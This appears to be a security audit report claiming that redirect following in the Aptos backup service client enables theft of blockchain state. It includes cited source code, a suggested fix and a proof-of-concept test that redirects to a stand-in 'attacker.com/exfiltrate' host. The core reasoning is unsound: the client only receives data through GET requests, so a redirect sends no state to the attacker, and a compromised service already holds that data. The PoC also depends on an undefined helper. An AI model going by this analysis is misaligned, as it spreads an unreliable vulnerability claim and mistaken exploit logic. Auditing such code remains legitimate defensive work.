# Audit Report

## Title
HTTP Redirect Following in Backup Service Client Enables Data Exfiltration

## Summary
The `BackupServiceClient` in the Aptos backup system uses a reqwest HTTP client that follows redirects by default. This allows an attacker who can intercept backup service traffic (via man-in-the-middle) or compromise the backup service to redirect sensitive blockchain state data to arbitrary external servers.

## Finding Description

The `BackupServiceClient` creates its HTTP client without explicitly disabling redirect following: [1](#0-0) 

The reqwest library follows up to 10 HTTP redirects by default for GET requests unless explicitly configured otherwise. Since the backup client uses GET requests for all data retrieval operations, an attacker can exploit this behavior: [2](#0-1) 

The backup service exposes highly sensitive endpoints that serve complete blockchain state: [3](#0-2) 

**Attack Scenario:**

1. **Compromised Backup Service**: If the backup service is compromised, an attacker can modify it to return HTTP 3xx redirect responses pointing to an attacker-controlled server. The backup client will automatically follow these redirects, sending all blockchain state data to the attacker's server.

2. **Man-in-the-Middle Attack**: The backup service uses HTTP by default (not HTTPS) as shown in production configurations: [4](#0-3) 

If the backup service is accessed over a network (especially across cluster boundaries), an attacker positioned on the network can inject HTTP redirects to steal data.

3. **DNS Hijacking**: If DNS is compromised to point to a malicious backup service, that service can use redirects to exfiltrate data while appearing to be the legitimate service.

The backup endpoints serve extremely sensitive data including:
- Complete state snapshots (all account data at specific versions)
- Transaction data with events and write sets  
- Merkle proofs for state and transaction verification
- Database state information

All of this data would be transmitted to the attacker-controlled server following the redirect.

## Impact Explanation

This vulnerability qualifies as **HIGH severity** according to Aptos bug bounty criteria because it enables:

1. **Significant Protocol Violation**: Complete exfiltration of blockchain state data, including all account balances, smart contract state, and transaction history
2. **Confidentiality Breach**: Sensitive validator node data can be stolen without detection
3. **Operational Security Failure**: Backup operations are critical infrastructure components that must maintain data confidentiality

While this doesn't directly cause consensus violations or fund loss, the exfiltration of complete blockchain state represents a severe security breach that could be used for:
- Privacy violations (exposing all account data)
- Reconnaissance for other attacks
- Competitive intelligence gathering
- Regulatory compliance violations

## Likelihood Explanation

**Likelihood: MEDIUM**

The exploit requires one of the following preconditions:
- Network position to perform MitM on HTTP backup traffic
- Compromise of the backup service itself
- DNS hijacking to redirect to malicious backup service

Factors increasing likelihood:
- HTTP is used by default (no TLS protection)
- No explicit redirect policy configured
- Backup services may be accessed across network boundaries in some deployments

Factors decreasing likelihood:
- Default configuration uses localhost (safe from external MitM)
- Production deployments typically use within-cluster service-to-service calls
- Would require either network access or service compromise

However, defense-in-depth principles dictate that sensitive data transfers should never follow redirects, regardless of other security controls.

## Recommendation

Explicitly disable redirect following in the reqwest client builder:

```rust
pub fn new(address: String) -> Self {
    Self {
        address,
        client: reqwest::Client::builder()
            .no_proxy()
            .redirect(reqwest::redirect::Policy::none())  // Add this line
            .build()
            .expect("Http client should build."),
    }
}
```

Additionally, consider:
1. Enforcing HTTPS for backup service connections
2. Adding certificate validation for remote backup services
3. Implementing request URL validation to ensure redirects (if needed) stay within expected domains
4. Adding logging/alerting when the backup service returns unexpected redirect responses

## Proof of Concept

```rust
// Test demonstrating redirect following vulnerability
use reqwest;
use tokio;

#[tokio::test]
async fn test_backup_client_follows_redirects() {
    // Start a malicious HTTP server that returns redirects
    let malicious_server = start_redirect_server("http://attacker.com/exfiltrate").await;
    
    // Create backup client pointing to malicious server
    let client = reqwest::Client::builder()
        .no_proxy()
        .build()
        .unwrap();
    
    // Make request - client will follow redirect to attacker.com
    let response = client.get(&format!("http://localhost:{}/db_state", malicious_server.port()))
        .send()
        .await
        .unwrap();
    
    // Verify redirect was followed
    assert_eq!(response.url().host_str(), Some("attacker.com"));
    println!("VULNERABLE: Client followed redirect to attacker-controlled server");
}

// Contrast with fixed version
#[tokio::test]
async fn test_backup_client_with_redirect_disabled() {
    let malicious_server = start_redirect_server("http://attacker.com/exfiltrate").await;
    
    // Create client with redirects disabled
    let client = reqwest::Client::builder()
        .no_proxy()
        .redirect(reqwest::redirect::Policy::none())  // FIX
        .build()
        .unwrap();
    
    // Make request - client will NOT follow redirect
    let result = client.get(&format!("http://localhost:{}/db_state", malicious_server.port()))
        .send()
        .await;
    
    // Verify redirect was not followed (will get 3xx status or error)
    assert!(result.is_err() || result.unwrap().status().is_redirection());
    println!("SECURE: Client did not follow redirect");
}
```

**Notes:**

This vulnerability exists because the reqwest HTTP client follows redirects by default, and the `BackupServiceClient` does not explicitly disable this behavior. While the default localhost configuration and within-cluster deployments reduce the practical exploitability, this represents a violation of security best practices for handling sensitive data. Any backup service that processes critical blockchain state should explicitly disable redirect following as a defense-in-depth measure.

### Citations

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L45-53)
```rust
    pub fn new(address: String) -> Self {
        Self {
            address,
            client: reqwest::Client::builder()
                .no_proxy()
                .build()
                .expect("Http client should build."),
        }
    }
```

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L55-84)
```rust
    async fn get(&self, endpoint: &'static str, params: &str) -> Result<impl AsyncRead + use<>> {
        let _timer = BACKUP_TIMER.timer_with(&[&format!("backup_service_client_get_{endpoint}")]);

        let url = if params.is_empty() {
            format!("{}/{}", self.address, endpoint)
        } else {
            format!("{}/{}/{}", self.address, endpoint, params)
        };
        let timeout = Duration::from_secs(Self::TIMEOUT_SECS);
        let reader = tokio::time::timeout(timeout, self.client.get(&url).send())
            .await?
            .err_notes(&url)?
            .error_for_status()
            .err_notes(&url)?
            .bytes_stream()
            .map_ok(|bytes| {
                THROUGHPUT_COUNTER.inc_with_by(&[endpoint], bytes.len() as u64);
                bytes
            })
            .map_err(futures::io::Error::other)
            .into_async_read()
            .compat();

        // Adding the timeout here instead of on the response because we do use long living
        // connections. For example, we stream the entire state snapshot in one request.
        let mut reader_with_read_timeout = TimeoutReader::new(reader);
        reader_with_read_timeout.set_timeout(Some(timeout));

        Ok(Box::pin(reader_with_read_timeout))
    }
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L47-79)
```rust
    // GET state_snapshot/<version>
    let bh = backup_handler.clone();
    let state_snapshot = warp::path!(Version)
        .map(move |version| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT, move |bh, sender| {
                bh.get_state_item_iter(version, 0, usize::MAX)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_item_count/<version>
    let bh = backup_handler.clone();
    let state_item_count = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(
                STATE_ITEM_COUNT,
                &(bh.get_state_item_count(version)? as u64),
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot_chunk/<version>/<start_idx>/<limit>
    let bh = backup_handler.clone();
    let state_snapshot_chunk = warp::path!(Version / usize / usize)
        .map(move |version, start_idx, limit| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT_CHUNK, move |bh, sender| {
                bh.get_state_item_iter(version, start_idx, limit)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);
```

**File:** terraform/helm/fullnode/templates/backup.yaml (L58-59)
```yaml
        - "--backup-service-address"
        - "http://{{ include "backup.backupService" . }}"
```
